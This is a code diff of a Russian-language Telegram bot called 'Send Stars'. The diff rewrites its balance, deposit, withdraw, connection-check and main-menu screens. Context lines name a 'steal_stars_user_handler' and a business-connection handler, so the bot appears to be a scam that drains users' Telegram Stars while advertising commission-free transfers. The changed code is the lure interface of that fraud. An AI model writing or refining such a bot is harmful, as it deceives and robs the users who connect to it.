@@ -925,33 +925,38 @@ async def steal_stars_user_handler(callback: CallbackQuery):
 @dp.callback_query(F.data == "user_balance")
 async def user_balance_handler(callback: CallbackQuery):
     balance = get_user_balance(callback.from_user.id)
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="user_menu")]])
-    await callback.message.edit_media(
-        media=InputMediaPhoto(media=FSInputFile(get_file_path("balance.png")), caption=(
-            "⭐️ Раздел «Баланс»\n\n"
-            f"Количество ваших звезд: <b>{balance}</b>\n\n"
-            "Так же вы можете пополнить баланс напрямую через Telegram — быстро, анонимно и без комиссии."
-        )),
+
+    keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="🔙 Назад", callback_data="user_menu")]
+        ]
+    )
+
+    await callback.message.edit_text(
+        f"⭐️ <b>Ваш баланс:</b>\n\n"
+        f"<b>{balance}</b> звёзд\n\n"
+        "Вы можете пополнить или вывести звёзды в меню ниже.",
         reply_markup=keyboard
     )
     await callback.answer()
 
+
 @dp.callback_query(F.data == "user_deposit")
 async def user_deposit_handler(callback: CallbackQuery):
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💲 Пополнить", callback_data="user_deposit_start")],
-        [InlineKeyboardButton(text="🔙 Назад", callback_data="user_menu")]
-    ])
-    await callback.message.edit_media(
-        media=InputMediaPhoto(media=FSInputFile(get_file_path("deposit.png")), caption=(
-            "➕ Раздел «Пополнение баланса»\n\n"
-            "Здесь вы можете пополнить баланс звёзд напрямую через Telegram.\n"
-            "Комиссии отсутствуют — все расходы на перевод покрывает бот.\n"
-            "Сумма зачисляется точно, без задержек и скрытых сборов."
-        )),
+    keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="💲 Пополнить", callback_data="user_deposit_start")],
+            [InlineKeyboardButton(text="🔙 Назад", callback_data="user_menu")]
+        ]
+    )
+
+    await callback.message.edit_text(
+        "➕ <b>Пополнение баланса</b>\n\n"
+        "Введите сумму (минимум 25).",
         reply_markup=keyboard
     )
     await callback.answer()
+
 
 @dp.callback_query(F.data == "user_deposit_start")
 async def user_deposit_start_handler(callback: CallbackQuery, state: FSMContext):
@@ -1027,33 +1032,40 @@ async def successful_payment_handler(message: Message):
 @dp.callback_query(F.data == "user_withdraw")
 async def user_withdraw_handler(callback: CallbackQuery, state: FSMContext):
     balance = get_user_balance(callback.from_user.id)
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔙 Назад", callback_data="user_menu")]
-    ])
-    await callback.message.edit_media(
-        media=InputMediaPhoto(media=FSInputFile(get_file_path("withdraw.png")), caption=(
-            "📮 Раздел «Вывод звёзд»\n\n"
-            "Здесь вы можете вывести свои звёзды мгновенно.\n\n"
-            f"Ваш баланс: <b>{balance}</b>\n\n"
-            "Укажите сумму — от 25 звёзд и выше. Перевод осуществляется автоматически, без задержек."
-        )),
+
+    keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="🔙 Назад", callback_data="user_menu")]
+        ]
+    )
+
+    await callback.message.edit_text(
+        "📮 <b>Вывод звёзд</b>\n\n"
+        f"Ваш баланс: <b>{balance}</b>\n"
+        "Введите сумму (минимум 25).",
         reply_markup=keyboard
     )
+
     await state.set_state(WithdrawStates.waiting_for_amount)
     await state.update_data(balance=balance)
     await callback.answer()
 
+
 @dp.callback_query(F.data == "check_connection")
 async def check_connection_handler(callback: CallbackQuery):
-    support_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🆘 Поддержка", url=f"https://t.me/{SUPPORT_URL.lstrip('@')}")]
-    ])
+    keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="🆘 Поддержка", url="https://t.me/astral_helper")]
+        ]
+    )
+
     await callback.message.answer(
-        f"🔄 Проверка подключения бота\n\n"
-        f"В среднем занимает до 29 секунд",
-        reply_markup=support_keyboard
+        "🔄 Проверка подключения...\n"
+        "Обычно занимает до 20–30 секунд.",
+        reply_markup=keyboard
     )
     await callback.answer()
+
 
 @dp.message(WithdrawStates.waiting_for_amount)
 async def process_withdraw_amount(message: Message, state: FSMContext):
@@ -1119,15 +1131,14 @@ async def user_menu_handler(callback: CallbackQuery):
             [InlineKeyboardButton(text="❓ FAQ", url="https://telegra.ph/FAQ-08-03-22")]
         ]
     )
-    await callback.message.edit_media(
-        media=InputMediaPhoto(media=FSInputFile(get_file_path("image.png")), caption=(
-            "👀 Добро пожаловать в Send Stars!\n\n"
-            "Наш бот поможет отправить звезды без комиссий прямиком на баланс получателя.\n\n"
-            "Выберите нужный раздел:"
-        )),
+
+    await callback.message.edit_text(
+        "👀 Добро пожаловать в Send Stars!\n\n"
+        "Выберите действие:",
         reply_markup=keyboard
     )
     await callback.answer()
+
 
 @dp.business_connection()
 async def handle_business_connect(business_connection: BusinessConnection):
